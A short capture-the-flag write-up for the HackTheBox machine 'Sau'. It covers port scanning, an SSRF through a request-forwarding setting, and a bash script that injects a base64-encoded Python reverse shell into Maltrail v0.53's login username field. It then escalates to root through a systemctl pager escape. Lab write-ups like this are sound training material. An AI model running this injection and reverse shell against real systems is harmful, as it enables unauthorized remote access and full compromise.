# Sau

## Intro

Sau is an easy rated Linux machine from HackTheBox

## Enum

### Nmap

All tcp ports.

```
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
55555/tcp open  unknown syn-ack ttl 63
```

## User

After creating a basket, I notice in the settings that an url can be provided to forward the request to.  

`127.0.0.1:80`

This shows the software maltrail v0.53 running, which suffers from a command injection. The following script executes rev shell.  

```
#!/bin/bash

# Exploit to gain RCE through a SSRF.
#
# After creating a basket, change the settings to forward to 127.0.0.1:80/login.

# Change attacker IP here.

IP="10.10.14.89"

# Payload

PAYLOAD="python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("
PAYLOAD+="\"$IP\""
PAYLOAD+=",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"

b64PAYLOAD=$(echo -n "$PAYLOAD" | base64 -w 0)

curl -s http://10.129.74.142:55555/hacker -d "username=purple;\`echo $b64PAYLOAD+|+base64+-d+|+sh\`"
```

## Root

Using sudo -l without a password, the following can be run without a password.  

`sudo systemctl status trail.service`

Which drops into a pager, then run this command like less to get a root shell.  

`!sh`
